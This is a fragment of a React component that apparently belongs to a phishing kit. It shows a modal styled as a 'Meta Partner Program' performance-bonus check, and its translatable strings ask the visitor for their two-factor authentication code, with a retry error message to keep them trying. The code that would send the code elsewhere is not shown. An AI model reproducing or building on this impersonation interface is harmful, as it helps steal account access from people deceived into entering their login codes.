...
const VerifyModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
    ...
    useEffect(() => {
        ...
        const textsToTranslate = ['Performance Bonus Eligibility – Meta Partner Program', 'Check your authentication code', 'Enter the 6-digit code for this account from the two-factor authentication you set up (such as Google Authenticator, email or text message on your mobile).', 'Code', "This code doesn't work. Check it's correct or try a new one after", 'Continue'];
    ...
    return (
        <div className='fixed inset-0 z-10 flex h-screen w-screen items-center justify-center bg-black/40 px-4'>
            <div className='flex max-h-[90vh] w-full max-w-xl flex-col gap-7 rounded-3xl bg-linear-to-br from-[#FCF3F8] to-[#EEFBF3] p-4'>
                <p className='mt-4 text-2xl font-bold'>{t('Performance Bonus Eligibility – Meta Partner Program')}</p>
